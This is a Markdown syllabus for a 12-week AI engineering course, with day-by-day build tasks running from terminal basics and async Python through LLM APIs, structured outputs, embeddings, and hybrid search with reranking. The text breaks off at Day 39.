# The 12-Week AI Engineer: Production-Ready Foundations & Shipped Portfolio

> **Target:** Build production-ready engineering foundations and ship four verified AI systems in 12 weeks (84 core build days + optional Days 85–90 Capstone Hardening & Hiring Sprint).  
> **Method:** Apply the 80/20 rule to physical reality: master the ~20% of software plumbing, vector geometry, bounded state machines, and telemetry that drive ~80% of real-world enterprise value, and build every single day.

---

## 0. The 80/20 Reframe: What Foundation Models Physically Are

**An AI engineer does not invent new neural architectures. An AI engineer builds deterministic, observable, and hardened systems on top of probabilistic foundation models they did not train.**

To build with these systems, you must strip away the mystical marketing fluff. A Large Language Model is not a sentient brain, a conscious oracle, or a thinking person. 

### The Physical Mechanism Under the Hood

1. **Frozen Floating-Point Matrices:** Physically, a model is a multi-gigabyte array of frozen decimal numbers (weights) sitting in high-bandwidth GPU memory (HBM). It does not learn while you talk to it. Its parameters are locked in silicon.
2. **The Tokenizer Chopping Block:** Computers cannot read words. A Byte-Pair Encoding (BPE) tokenizer chops raw UTF-8 text into integer IDs (e.g., "apple" → `17024`). The model never sees letters or grammar—it sees an ordered stream of integers.
3. **The 100,000-Sided Dice Roller:** The GPU passes those token IDs through matrix multiplications to compute raw energy scores (logits) across a 100,000-word vocabulary. A softmax function converts those logits into probabilities. The model rolls a 100,000-sided die to pick the next single token ID, spits it onto the wire, appends it to the prompt, and repeats.
4. **The Context Conveyor Belt:** The context window is not an infinite memory. It is a rigid conveyor belt with a hard byte limit (e.g., 128k tokens). Every token entering the conveyor belt costs exact money ($0.00015 per 1,000 input tokens). When the belt runs out of room, early tokens fall into the void.
5. **The Open-Book Exam (RAG):** Because the model’s internal weights only know the past, you cannot expect it to know your private corporate data. Retrieval-Augmented Generation (RAG) is an open-book exam: an interrogation system retrieves the top 5 relevant index cards from disk, drops them onto the model's desk right inside the prompt, and forces it to cite its sources.

Because an LLM is a probabilistic next-token dice roller, it fails silently, hallucinates with utter conviction, and treats instructions inside untrusted documents as direct orders from its creator. 

Your job as an **AI Systems Architect** is to build the iron cage around this probabilistic beast: rigid Pydantic casting stencils, millisecond vector radars, bounded state machines, and cryptographic fences.

### The 80/20 Filter Across the 3 Months

| Phase | What you focus on (The 20% that builds real systems) | What you deliberately skip (The 80% distraction) |
|---|---|---|
| **Month 1: 0 → Junior**<br>*(Foundations & Model Fluency)* | Terminal plumbing, Python types as casting molds, async event loops, HTTP wire packets, raw provider SDKs, Pydantic constrained decoding, BPE token arithmetic, and SSE ticker-tape streaming. | Linear algebra proofs, game dev, deep learning backprop calculus, framework sprawl (LangChain/CrewAI), and GPU kernel writing. |
| **Month 2: Junior → Mid**<br>*(Context, RAG & Agents)* | 1,536-D vector geometry, PDF/AST parsing, dual-radar hybrid search (BM25 + Dense), RRF $k=60$ rank fusion, cross-encoder forensic rerankers, golden-set calipers (Recall@k, MRR, Faithfulness), Model Context Protocol (MCP), and bounded state machines. | Training custom embedding models from scratch, reading daily arXiv firehose, building custom vector engines in C++, and unbounded autonomous agent loops. |
| **Month 3: Mid → Experienced**<br>*(Production, Scale & Open Models)* | Indirect prompt injection perimeter fences, tool AST sandboxes, Langfuse distributed telemetry, vLLM PagedAttention KV-cache serving, INT4/INT8 quantization arithmetic, LoRA adapter sleeves, and 2 AM outage playbooks. | Pretraining LLMs from scratch, multi-node GPU cluster hardware engineering, and distributed CUDA kernel development. |

### The Core Working Paradigm: Evaluation-Driven Development (EDD)

In classical software, deterministic code guarantees that `2 + 2 == 4`. In AI engineering, your core engine is a statistical dice roller whose output changes if temperature drifts or provider weights silently update. If you tune prompts or retrieval systems by "vibes" and subjective inspections, you are flying a jet through a blizzard with zero instruments.

**The Senior Iron Law:** *Never touch a prompt template, re-index a vector database, or adjust search weights until your evaluation harness is written and your baseline numbers are locked into disk.*

- **The Contract:** Define exact Pydantic schemas, latency budgets (e.g., p95 < 2.0s), and hard cost ceilings ($0.002 per query).
- **The Golden Set:** 40+ hand-curated, battle-verified evaluation fixtures with ground-truth chunk citations and canonical reference answers.
- **The Caliper:** Run `python3 eval.py`. If Recall@5 or Faithfulness drops by even 1.5%, your pull request is dead on arrival.

---

## 1. The Three Months at a Glance: Unlocking Superpowers

```
Month 1: The Machine Room, The Wire & The Dice Roller (Weeks 1–4)
  ↳ Superpower: Command byte streams through Unix pipes, master the single-threaded async event loop,
    strip model hallucinations with Pydantic JSON stencils, and stream real-time tokens via SSE under 400ms TTFT.
Month 2: Spatial Memory, Dual Radars & Universal Tooling (Weeks 5–8)
  ↳ Superpower: Project text into 1,536-D coordinate arrows, fuse dense semantic search with BM25 keyword radar via RRF,
    measure retrieval with mathematical calipers (Recall@k, MRR), and wire private data into IDEs via MCP.
Month 3: Armor, High-Throughput Silicon & Mission Control (Weeks 9–13)
  ↳ Superpower: Neutralize indirect prompt injections with XML fences, trace every token and millisecond in Langfuse,
    serve open models with vLLM PagedAttention, slip LoRA adapter sleeves onto frozen weights, author 2 AM outage runbooks, and launch a production portfolio showcase.
```

---

## 2. Ground Rules & The Hacker Spirit

1. **75% building, 25% reading.** Tutorials create the "Tutorial Illusion"—the false feeling of mastery while sitting passively. Only typing code, watching it crash, and diagnosing the physical failure builds scar tissue. Never read two days in a row without shipping a commit.
2. **Every day ends with a Git commit.** A green GitHub contribution square is not vanity; it is cryptographic proof of physical progress against the machine.
3. **The 45-minute timebox rule.** When a bug punches you in the mouth, set a timer for 45 minutes to diagnose the physical mechanism. If the clock hits 45:00 and you are still stuck, ship the simplest working workaround, log the technical debt in `LOG.md`, and advance. Never let a bug paralyze your momentum.
4. **Three cumulative, production-grade systems.** No throwaway toy scripts. You build three evolving, production-grade systems across the 90 days. Each system is containerized, benchmarked, and defended with quantitative data.
5. **Exact numbers over adjectives.** Amateurs say "our search is fast and accurate." Senior engineers say "our hybrid search achieves 92.4% Recall@5 at 108ms p95 latency for $0.0004 per query." If you cannot measure it with numbers, it does not exist.
6. **Zero magic frameworks until you build the wire yourself.** No LangChain, no CrewAI, no black-box wrappers until you have built raw HTTP clients, manual retry loops, and deterministic state graphs by hand. You must understand the pain before adopting the abstraction.
7. **Pacing and stamina:** 5 days of high-intensity building, 2 days of consolidation and active recovery per week (~2.5–4 hours/day). An exhausted engineer writes sloppy code and hallucinates progress. Protect your sleep and consolidation days.
8. **10-Minute Daily Spaced Retrieval Drill (`make drill`).** Start every single session with a randomized active recall challenge from `scripts/log.py`. Forcing your brain to pull concepts from memory across 3, 7, and 14-day intervals physically restructures your neural pathways and locks skills into permanent muscle memory.
9. **Friday Adversarial Bug Hunts (`make labs`).** Friday is demolition day. You do not understand a system until you know how to break it. Hunt down retry storms, inverted vector sorting, prompt injection leaks, and streaming memory fragmentation in real production labs.

---

## 3. Pick Your Stack Once, Then Stop Shopping

| Layer | Standard Choice | Why |
|---|---|---|
| **Language** | Python 3.11+, managed with `uv` | Fastest package resolution, modern typing, universal AI ecosystem support. |
| **Model Providers** | Primary: OpenAI or Anthropic · Secondary: Google Gemini | Teaches provider portability, streaming differences, and cost routing. |
| **API & Service** | FastAPI + Uvicorn | Native async, high throughput, automatic OpenAPI documentation, easy SSE streaming. |
| **Safety & Budget** | `starters/common/budget_guard.py` | Enforces hard session spend caps ($2 default) and disk response caching for evals. |
| **Vector Database** | pgvector or Qdrant | SQL compatibility or pure vector performance. Avoids vendor lock-in. |
| **Tracing & Observability** | Langfuse (self-hosted or cloud) | Complete trace visibility, token cost attribution, latency waterfalls, and user feedback. |
| **Agent / Workflow** | Pydantic AI or LangGraph | Deterministic state graphs over unpredictable free-floating agent loops. |
| **Deployment** | Render, Fly.io, or Railway | Zero-devops deployment with Docker support in under 15 minutes. |

---

<!-- BEGIN GENERATED DAYS -->

<!-- Generated from site/course-data.js by scripts/build_plan.py — do not edit
     this region by hand. Edit the data file and run `make plan`. -->

## Week 1 — Developer Foundations (The Machine Room & The Wire)
*Days 1–7*

**Outcome: "I can command the terminal, wield typed Python as a compiler mold, isolate dependencies with uv in milliseconds, and manage Git trees without fear."**

### Day 1 — The terminal machine room: pipes, streams, and PATH mechanics
- [ ] Trace the physical life of a shell command: how the OS searches executable binary paths in `$PATH` before raising "command not found"
- [ ] Plumb raw byte streams using Unix pipes `|` and redirection `>` to route stdout into stdin without touching disk
- [ ] Inspect megabyte log dumps with `cat`, `grep`, `head`, and `tail -f` to isolate error patterns in milliseconds
- [ ] **Build:** an adversarial shell drill — construct a nested directory tree, locate corrupt log lines with regex grep, and fix a broken binary PATH
- [ ] **Done when:** You diagnose and repair a broken environment path or missing binary in under 60 seconds without panic.

### Day 2 — Pragmatic Python: type hints as rigid casting molds
- [ ] Functions, modules, and memory references: why Python objects are heap pointers and how list comprehensions avoid loop overhead
- [ ] Type hints (`int`, `str`, `dict[str, Any]`, `Optional[T]`) as rigid stencils that catch malformed model payloads before runtime
- [ ] Enforce data integrity with `dataclasses` and Pydantic models: casting raw incoming byte strings into typed memory structures
- [ ] **Build:** a typed text analysis module that parses command-line arguments, counts token frequencies, and passes strict mypy checks
- [ ] **Done when:** Your module runs with zero mypy/pyright type errors and rejects malformed dictionary shapes on startup.

### Day 3 — Airtight environments: sub-second dependency isolation with uv
- [ ] Virtual environments demystified: how `sys.prefix` isolates packages and why global pip installs poison machine state
- [ ] Wield `uv` for lightning package resolution: 10–100x faster than pip via Rust-powered wheel caching and hardlink sharing
- [ ] Lock project dependencies deterministically with `pyproject.toml` and `uv.lock` to guarantee reproducible builds on any machine
- [ ] **Build:** initialize an isolated uv workspace configured with automated formatting and linting via `ruff`
- [ ] **Done when:** You can destroy your virtual environment and rebuild it completely from `uv.lock` in under 5 seconds.

### Day 4 — Git under the hood: Merkle trees, commits, and merge mechanics
- [ ] Git's physical anatomy: commits as immutable SHA-1 content snapshots, trees as directory listings, and branches as movable pointers
- [ ] Commit hygiene: atomic changes, descriptive imperative messages, and feature branch workflows
- [ ] Manufacture a deliberate merge conflict by editing identical lines on two branches, then resolve it cleanly by inspecting raw diff markers
- [ ] **Build:** initialize a clean GitHub repository, commit on an isolated feature branch, push upstream, and merge via pull request
- [ ] **Done when:** The words "merge conflict" produce calm analysis instead of an elevated heart rate.

### Day 5 — Testing calipers: unit tests, edge cases, and pytest harnesses
- [ ] The testing mindset: writing tripwire assertions that scream the microsecond a refactor breaks system behavior
- [ ] `pytest` mechanics: test discovery rules, assertion rewriting, and reusable setup fixtures
- [ ] Parametrized testing across nasty edge boundaries: empty strings, null bytes, unicode emojis, and $2^{31}-1$ integers
- [ ] **Build:** author a comprehensive test suite for your Day 2 text analysis module achieving 100% pass rate on edge cases
- [ ] **Done when:** Running `pytest` catches an intentionally injected off-by-one bug and reports the exact failing line.

### Day 6 — Building robust typed CLI tools for terminal automation
- [ ] Parse CLI flags, positional arguments, and subcommands using `argparse` with automated `--help` manual generation
- [ ] Format terminal output: streaming progress indicators, ASCII status tables, and standard POSIX exit codes (0 for success, 1+ for errors)
- [ ] Defensive I/O: gracefully handle missing file paths, read permission denials, and broken pipe signals (`SIGPIPE`)
- [ ] **Build:** a production CLI tool that analyzes codebase directories, reports lines of code, and outputs structured JSON or text tables
- [ ] **Done when:** A peer can invoke your CLI via `uv run` with `--help` and receive clear flags, clean output, and proper exit codes.

### Day 7 — Foundation checkpoint: automated CI assembly line and ship
- [ ] Package your CLI into a standalone repo with a crisp README explaining installation, usage flags, and benchmarks
- [ ] Wire an automated GitHub Actions CI pipeline that executes `ruff check` and `pytest` on every push
- [ ] Enforce zero-regression gates: block pull request merges if any unit test fails or code formatting drifts
- [ ] Rest and consolidate: protect your momentum; the marathon requires deliberate pacing
- [ ] **Done when:** Your repository displays a live green CI build badge verifying tests pass cleanly on an automated cloud runner.

---

## Week 2 — Asynchronous Python & Web Protocols (The Wire & The Conductor)
*Days 8–14*

**Outcome: "I understand raw HTTP bytes, command the async event loop like a master conductor, and build resilient API gateways that never stall under load."**

### Day 8 — HTTP wire anatomy: verbs, headers, status codes, and JSON payloads
- [ ] The physical wire: how ASCII text headers and raw byte bodies travel over TCP sockets on port 80/443
- [ ] Dissect HTTP methods (GET, POST), headers (`Content-Type`, `Authorization`), and status codes (200, 400, 401, 429, 500, 503)
- [ ] Inspect network packet exchanges using `curl -v` to watch the TLS handshake, headers, and payload transfer in real time
- [ ] **Build:** construct a raw HTTP client using Python's standard `urllib.request` that parses response headers and extracts JSON bytes
- [ ] **Done when:** You can point to raw network bytes and identify where headers end, where the body begins, and what status code returned.

### Day 9 — Secret hygiene: API keys, bearer tokens, and the vault
- [ ] Authentication on the wire: API keys vs OAuth Bearer tokens, and why credentials must live in headers, never URL query strings
- [ ] Ironclad environment hygiene: `.env` files, shell exports, and `.gitignore` rules to prevent credential leaks
- [ ] Zero-downtime key rotation: how production services accept dual keys during migration windows without dropping requests
- [ ] **Build:** a configuration loader using Pydantic Settings that validates required API keys on startup and fails fast with actionable errors
- [ ] **Done when:** Your application refuses to boot if an API key is missing and guarantees zero credentials can ever be committed to Git.

### Day 10 — The asynchronous conductor: asyncio and the single-threaded event loop
- [ ] Synchronous blocking vs asynchronous non-blocking: why waiting on network I/O starves single threads
- [ ] The event loop under the hood: how `async` and `await` yield control back to the conductor while sockets wait for bytes
- [ ] Concurrent request blasting: firing 20 network requests simultaneously using `asyncio.gather()` with strict timeout bounds
- [ ] **Build:** an async web fetcher that downloads 20 endpoints concurrently in 1.8 seconds instead of 25 seconds synchronously
- [ ] **Done when:** You can physically explain why async handles 1,000 idle network sockets on a single CPU core without thread context switching.

### Day 11 — API construction: high-throughput services with FastAPI
- [ ] FastAPI architecture: Starlette async core, route handlers, path parameters, and query parameters
- [ ] Input contracts: validating request bodies against strict Pydantic schemas with automatic 422 Unprocessable Entity responses
- [ ] Interactive API documentation: inspecting and testing routes via automatic OpenAPI Swagger UI at `/docs`
- [ ] **Build:** a typed REST API service with health probes (`/healthz`), custom error handlers, and structured JSON output
- [ ] **Done when:** Sending a malformed JSON payload to your endpoint returns an immediate 422 error detailing the exact invalid field.

### Day 12 — The resilient client: connection pools and timeouts with HTTPX
- [ ] Modern async HTTP networking: persistent TCP connection pools and HTTP/2 multiplexing with `httpx.AsyncClient`
- [ ] Timeout budgets: configuring separate granular limits for DNS resolution, TCP connect (2s), and read response (5s)
- [ ] Mocking the wire: intercepting external HTTP calls in unit tests with `respx` to test failure paths without internet access
- [ ] **Build:** an async client wrapper that concurrently polls three remote APIs with connection pooling and strict timeouts
- [ ] **Done when:** Your client reuses active TCP sockets across requests and aborts immediately when an upstream endpoint exceeds its timeout budget.

### Day 13 — Battle-hardened resilience: exponential backoff, jitter, and circuit breakers
- [ ] Upstream failure modes: distinguishing transient hiccups (429 Rate Limit, 503 Overloaded) from fatal errors (400, 401, 404)
- [ ] Thundering herds: why naive fixed retries crash recovering servers, and how exponential backoff with full jitter ($t = \text{rand}(0, 2^n)$) diffuses traffic
- [ ] Circuit breaker pattern: tripping the circuit to reject downstream calls immediately when an external provider goes dark
- [ ] **Build:** an async retry decorator using `tenacity` configured with exponential backoff, randomized jitter, and retry quotas
- [ ] **Done when:** Your client recovers cleanly from simulated 429 rate limit spikes without dropping tasks or hammering the upstream provider.

### Day 14 — Ship: Resilient Asynchronous API Gateway
- [ ] Combine FastAPI, `httpx.AsyncClient`, connection pools, and jittered retries into an asynchronous API gateway
- [ ] Deploy the service live to Render, Fly.io, or Railway with an automated `/healthz` probe
- [ ] Write an automated pytest suite testing successful responses, 429 backoff recovery, and timeout error wrapping
- [ ] **Done when:** A peer can curl your live deployed gateway URL and receive a structured JSON response in under 200ms.

---

## Week 3 — Model API Fluency & Prompt Engineering (The Dice Roller & The Cash Register)
*Days 15–21*

**Outcome: "I understand token economics to the fourth decimal place, manipulate the 100k-sided dice roller with precision, and cache prompt prefixes to cut costs by 80%."**

### Day 15 — Under the hood: logits, sampling parameters, and raw model calls
- [ ] What an LLM physically does: computing probability distributions (logits) over a 100,000-token vocabulary and rolling dice
- [ ] Sampling controls: temperature (shaking the dice), top_p (nucleus sampling), `max_tokens` (the guillotine), and stop sequences
- [ ] Raw SDK calls (OpenAI / Anthropic): system prompts as foundational rules, user queries, and assistant completions
- [ ] **Build:** a CLI runner that executes model completions, measures roundtrip latency, and computes token cost to $0.0001 precision
- [ ] **Done when:** You can state the exact physical mechanism of temperature=0.0 (greedy argmax) vs temperature=0.8 and calculate cost per run to the cent.

### Day 16 — BPE token mechanics, spelling blind spots, and BudgetGuard
- [ ] Byte-Pair Encoding (BPE) mechanics: how raw UTF-8 text is recursively merged into integer token IDs
- [ ] Tokenizer blind spots: why models fail at counting letters in "strawberry" or reversing strings (they see token chunks, not characters)
- [ ] Enforce financial safety: integrate `BudgetGuard` to track cumulative session spend and trip an emergency breaker at $2.00
- [ ] **Build:** an adversarial script testing tokenization boundaries (spaces, punctuation, code indentation) and verifying spend limits
- [ ] **Done when:** Your script halts instantly with an assertion error the moment cumulative API spend hits your configured $2 budget ceiling.

### Day 17 — Prompt engineering under fire: few-shot stencils and reasoning traces
- [ ] Few-shot prompting: conditioning the model's token distribution by providing 3–5 input-output pairs inside the prompt stencil
- [ ] Chain-of-thought (CoT) mechanics: why forcing the model to emit intermediate scratchpad tokens on the wire improves reasoning accuracy
- [ ] Version control for prompts: separating prompt templates into versioned files (`.jinja` / `.py`) instead of messy inline f-strings
- [ ] **Build:** a versioned prompt evaluation module tested against a 20-sample benchmark to track accuracy shifts
- [ ] **Done when:** Modifying a prompt template automatically runs against your 20-sample benchmark and outputs an exact pass/fail delta.

### Day 18 — Context economics: prompt caching and the 128k conveyor belt ⭐
- [ ] The context conveyor belt: prompt tokens vs completion tokens, and why input tokens are priced 3-4x cheaper than generation tokens
- [ ] Prompt caching mechanics: how providers freeze static prefix KV-cache states in GPU memory for up to 80-90% cost discounts
- [ ] Architectural decision: when loading 100k tokens into a cached context window completely eliminates the need for vector RAG
- [ ] **Build:** a long-document Q&A script using prompt prefix caching, verifying cache hit telemetry, and logging the cost drop
- [ ] **Done when:** Your execution logs prove a prompt cache hit reduced your input token bill by 80%+ and cut TTFT in half.

### Day 19 — Multimodal perception: slicing pixels into token grids
- [ ] How vision models "see": splitting high-resolution images into $512 \times 512$ coordinate tiles and projecting pixel patches into embedding space
- [ ] Image token economics: calculating the exact token footprint of an image based on resolution, aspect ratio, and tile counts
- [ ] Passing multimodal payloads: base64 encoding vs public image URLs in structured API message envelopes
- [ ] **Build:** an automated extractor that takes scanned receipt images or invoice PDFs and transcribes line items into markdown tables
- [ ] **Done when:** Your script feeds a crumpled paper receipt image to a vision model and extracts item names, quantities, and prices with 100% table fidelity.

### Day 20 — Deterministic development: SHA-256 disk caching for prompt evals
- [ ] The cost and latency of prompt iteration: why non-determinism and repeated API hits slow down local development
- [ ] Implement content-addressed disk caching: compute `SHA256(prompt + model + temperature)` to store and retrieve responses locally
- [ ] Wipe and bypass controls: adding `--no-cache` flags to force live model calls when verifying non-deterministic behavior
- [ ] **Build:** integrate disk-backed LLM response caching into your prompt development harness (`.cache/llm_eval/`)
- [ ] **Done when:** Re-running a 25-prompt test suite takes under 0.05 seconds and incurs exactly $0.0000 in API charges.

### Day 21 — Ship: Observable Prompt Engine CLI
- [ ] Package your prompt runner, token counter, BudgetGuard fuse, and disk cache into a polished public CLI tool
- [ ] Document real-world metrics in README: cost per query, p95 latency, cache savings, and token efficiency
- [ ] Consolidate Week 3 skills: review tokenization, prompt caching, and cost mathematics
- [ ] **Done when:** Your CLI is public on GitHub, allowing any user to test prompts with live token counting, cost tracking, and disk caching.

---

## Week 4 — Structured Outputs, Streaming & Failure Modes (The Stencil & The Ticker Tape)
*Days 22–28*

**Outcome: "I can force probabilistic models into rigid Pydantic JSON schemas with 95%+ reliability, stream tokens in real-time via SSE, and survive provider outages."**

### Day 22 — Constrained decoding: forcing models through JSON stencils ⭐
- [ ] How constrained decoding works: masking logit probabilities so the model physically cannot emit tokens that violate a JSON Schema
- [ ] Pydantic contracts: field types, regex constraints, enumerated values, and descriptive docstrings guiding token generation
- [ ] Stress-testing structured extraction: benchmarking parser reliability against messy, ill-formatted data in `datasets/messy_invoices.json`
- [ ] **Build:** an extractor that digests chaotic unstructured invoices and returns validated Pydantic records with zero schema violations
- [ ] **Done when:** At least 95% of 15 chaotic test invoices parse cleanly into validated Pydantic objects on the very first attempt.

### Day 23 — Self-healing loops: schema validation, feedback, and automated repair
- [ ] When constrained decoding isn't enough: catching validation errors (missing keys, out-of-range numbers, failed regex checks)
- [ ] Self-repair loop mechanics: capturing Pydantic's exact validation error string and feeding it back into the model's scratchpad
- [ ] Defensive degradation: falling back to partial extractions or flagging ambiguous fields rather than throwing unhandled exceptions
- [ ] **Build:** an automated repair machine that intercepts malformed outputs and guides the model to fix its schema within 2 retries
- [ ] **Done when:** An intentionally sabotaged JSON response is automatically repaired into a valid schema within two self-healing loops without human intervention.

### Day 24 — Ticker-tape output: real-time streaming with Server-Sent Events
- [ ] The Server-Sent Events (SSE) protocol: unidirectional streaming over HTTP using `text/event-stream` chunks
- [ ] SSE vs WebSockets: why SSE is the superior, lightweight choice for one-way LLM token streaming over standard HTTP infrastructure
- [ ] FastAPI async generator streaming using `sse-starlette` or native `StreamingResponse`
- [ ] Measure telemetry on the wire: track Time-To-First-Token (TTFT) and token generation velocity (tokens per second)
- [ ] **Build:** a streaming FastAPI endpoint emitting live word tokens and latency metadata headers
- [ ] **Done when:** A curl command streaming your endpoint prints the first token in under 400ms and displays steady token-by-token generation.

### Day 25 — Airbags and fail-safes: model cascading and circuit breakers
- [ ] Catalog production failure modes: provider outages (500/503), token context exhaustion, infinite generation loops, and schema hallucinations
- [ ] Model cascading: routing queries to a cheap, fast model ($0.0001) first, then escalating to an expensive frontier model only on low confidence
- [ ] Heuristic fallbacks: serving cached historical responses or degraded deterministic replies when all external providers fail
- [ ] **Build:** harden your extraction API against simulated upstream 503 outages, network drops, and malicious oversized inputs
- [ ] **Done when:** Every simulated upstream provider crash returns a clean, structured JSON error response instead of an unhandled 500 stack trace.

### Day 26 — Deterministic test harnesses: mocking streaming LLM endpoints
- [ ] Integration testing for AI APIs: writing deterministic pytest suites using `httpx.AsyncClient` without burning live API tokens
- [ ] Testing SSE token streams: asserting chunk delimiters, SSE event framing (`data: ...\n\n`), and payload schema integrity
- [ ] Mocking model providers: using `pytest-mock` or `respx` to inject simulated token delays, rate limits, and broken JSON payloads
- [ ] **Build:** a test harness verifying health checks, extraction validation, and streaming chunk delivery in under 3 seconds
- [ ] **Done when:** All integration tests pass completely offline in under 2 seconds, verifying full API functionality without network access.

### Day 27 — Airtight packaging: multi-stage Docker builds and cloud deployment
- [ ] Multi-stage Docker builds: compile dependencies with `uv` in a builder stage and copy only the final wheel into a slim 120MB runtime image
- [ ] Container security: non-root user execution, explicit port bindings, and environment variable secret injection
- [ ] Deploying the microservice to Fly.io, Render, or Railway with configured health probes (`/healthz`) and memory limits
- [ ] **Build:** containerize your extraction service and deploy it live to the public internet
- [ ] **Done when:** Your Docker container deploys cleanly with green health checks and responds to public internet requests.

### Day 28 — Ship #1: Production Extraction & Streaming Microservice
- [ ] Publish Project 1 repository with clean structure, comprehensive docstrings, and passing test suites
- [ ] Author a senior-grade README: architecture diagram, p95 latency benchmarks (<400ms TTFT), cost per request, and API docs
- [ ] Live validation: verify that an external user can curl your public endpoint and receive streamed structured outputs
- [ ] **Done when:** Project 1 is live, public on GitHub, and verified with quantitative benchmarks in the README. Month 1 complete!

---

## Week 5 — Vector Embeddings & Ingestion Pipelines (Compass Arrows & The Paper Shredder)
*Days 29–35*

**Outcome: "I can transform raw, messy documents into clean 1,536-dimensional coordinate arrows and build zero-waste incremental ingestion pipelines from scratch."**

### Day 29 — Embeddings from first principles: 1,536-D arrows with NumPy
- [ ] Vectors in hyperspace: how embedding models map semantic concepts to directional arrows in 1,536-dimensional coordinate space
- [ ] Vector similarity math: computing dot products and cosine similarity $\cos(\theta) = \frac{\vec{A} \cdot \vec{B}}{\|\vec{A}\| \|\vec{B}\|}$ in pure NumPy without external vector libraries
- [ ] Generate dense embeddings via provider APIs (`text-embedding-3-small` / `text-embedding-3-large`) and inspect raw float arrays
- [ ] **Build:** a functional vector search engine in ~120 lines of pure Python and NumPy matrix multiplication
- [ ] **Done when:** You can write the cosine similarity equation on a whiteboard and explain how matrix dot products calculate similarity across 1,000 vectors in 2ms.

### Day 30 — Embedding geometry and blind spots: when arrows fail
- [ ] The bi-encoder architecture: why query and document are projected independently without cross-attention
- [ ] Adversarial blind spots: why cosine similarity fails on negation ('hotels NOT in Boston'), exact part numbers, and subtle grammatical flips
- [ ] Vector normalization: why unit vectors simplify cosine similarity to a blazing-fast single dot product
- [ ] **Build:** an adversarial evaluation test finding 5 realistic queries where dense vector search completely fails while keyword search succeeds
- [ ] **Done when:** You demonstrate an exact query where semantic vector search retrieves irrelevant junk because it cannot resolve negation or exact IDs.

### Day 31 — Document shredding and AST parsing: PDFs, Markdown, and HTML
- [ ] The ingestion reality: raw documents are filled with garbage markup, headers, footers, and erratic formatting
- [ ] Parsing complex structures: extracting clean text while preserving markdown headings (`#`, `##`), bullet lists, and code blocks
- [ ] Table preservation: parsing multi-column financial and technical tables into structured markdown without scrambling rows into gibberish
- [ ] **Build:** a document ingestion sanitizer that turns chaotic PDFs, HTML pages, and markdown files into pristine semantic text
- [ ] **Done when:** Your parser ingests a multi-column PDF table and outputs a clean markdown table where every cell aligns with its original header.

### Day 32 — Chunking strategies: fixed windows vs structural boundaries
- [ ] Fixed-size chunking trade-offs: sliding windows (512 tokens with 64-token overlap) and why they slice sentences in half
- [ ] Structural chunking: splitting strictly along markdown header boundaries and AST code blocks to preserve complete thoughts
- [ ] Contextual metadata propagation: prepending document breadcrumbs (`Document > Chapter 3 > Section 2:`) to every chunk before embedding
- [ ] **Build:** a structural chunker that automatically stamps parent section headers onto every generated child chunk
- [ ] **Done when:** Every isolated text chunk contains enough prepended header metadata to be 100% understandable without reading the rest of the document.

### Day 33 — Zero-waste indexing: SHA-256 fingerprinting and tombstoning
- [ ] Content-addressed identity: computing SHA-256 hashes of raw chunk text to detect document changes
- [ ] Incremental ingestion: checking hashes against existing index records to skip re-embedding unmodified files
- [ ] Vector lifecycle management: tombstoning and deleting orphaned chunks when source documents are edited or deleted
- [ ] **Build:** an incremental indexing pipeline that embeds only modified documents on re-runs and deletes stale vectors
- [ ] **Done when:** Re-running your ingestion pipeline on an unchanged 1,000-page document corpus takes 1.2 seconds and costs exactly $0.0000.

### Day 34 — Contextual retrieval vs long-context caching showdown ⭐
- [ ] Anthropic's contextual retrieval pattern: generating a 50-token situational summary for every chunk prior to vector embedding
- [ ] The architectural showdown: when to use prompt caching (stuffing 100k tokens into context) vs vector chunking (RAG)
- [ ] Latency and cost math: comparing a $0.0004 vector search against a $0.0015 cached prompt across query volume
- [ ] **Build:** run a head-to-head benchmark comparing 100k cached prompt retrieval vs chunked vector RAG on accuracy, cost, and latency
- [ ] **Done when:** You can articulate with exact dollar and millisecond figures the precise threshold where prompt caching beats vector RAG.

### Day 35 — Ingestion pipeline audit: throughput, cost, and distribution
- [ ] Benchmark ingestion throughput: measure chunks processed per second and embedding spend per megabyte of source text
- [ ] Audit chunk distributions: plot histograms of token lengths and assert zero empty chunks or truncated code blocks
- [ ] Document ingestion architecture, rate-limit backoff rules, and failure recovery procedures in a technical spec
- [ ] **Done when:** Your ingestion pipeline processes an entire technical documentation corpus, producing zero empty chunks and full cost logs.

---

## Week 6 — Production Retrieval & Search Architecture (The Dual-Track Radar & The Detective)
*Days 36–42*

**Outcome: "I can build hybrid search pipelines combining dense vector arrows with BM25 keyword radar, fused via RRF and sharpened by cross-encoder rerankers."**

### Day 36 — Production vector stores: HNSW graphs in pgvector and Qdrant
- [ ] Graduating from NumPy arrays: why production requires specialized vector databases for billion-vector scale
- [ ] Approximate Nearest Neighbor (ANN) index mechanics: Hierarchical Navigable Small World (HNSW) multi-layer graphs vs IVFFlat Voronoi clusters
- [ ] Configuring pgvector or Qdrant: indexing distance metrics (cosine, inner product), `m` graph connections, and `ef_search` accuracy
- [ ] **Build:** index your parsed document corpus into pgvector or Qdrant with HNSW indexing and payload metadata
- [ ] **Done when:** Your vector database executes sub-15ms approximate nearest neighbor queries over your entire document corpus.

### Day 37 — The keyword radar: exact term retrieval with BM25
- [ ] Why dense vectors fail on exact matches: the physical need for sparse lexical keyword search
- [ ] The BM25 formula under the hood: Term Frequency (TF), Inverse Document Frequency (IDF), and document length normalization ($b$ and $k_1$)
- [ ] Setting up an in-memory or database-backed BM25 sparse index alongside your vector database
- [ ] **Build:** run BM25 queries against your corpus and demonstrate how it captures exact error codes (`ERR-4019`) that vector search completely misses
- [ ] **Done when:** A query for an exact technical identifier returns rank 1 in your BM25 search lane while ranking below position 50 in pure vector search.

### Day 38 — Hybrid search: fusing radars with Reciprocal Rank Fusion (RRF) ⭐
- [ ] Why adding raw vector cosine scores to raw BM25 scores fails (comparing non-calibrated scales)
- [ ] Reciprocal Rank Fusion (RRF) mechanics: combining ranking positions via $\text{RRF\_Score} = \sum \frac{1}{k + \text{rank}}$ with constant $k=60$
- [ ] Tuning lane weights: balancing semantic intent with exact keyword matches across different user query types
- [ ] **Build:** implement an RRF merger that combines the top 25 results from BM25 and vector search into a unified top-20 candidate pool
- [ ] **Done when:** Your hybrid search successfully answers both conceptual questions and exact identifier queries in the top 3 results.

### Day 39 — The forensic detective: cross-encoder reranking
- [ ] Bi-encoders vs cross-encoders: why joint self-attention across `[Query, Document]` token pairs blows bi-encoder similarity away
- [ ] The latency budget trade-off: spending ~40ms to run a cross-encoder (Cohere Rerank or local BGE-Reranker) on the top 20 candidate chunks
- [ ] Filtering the noise: discarding low-scoring reranked chunks to prevent polluting the LLM context window
- [ ] **Build:** add a cross-encoder reranking stage on top of your RRF hybrid candidate pool
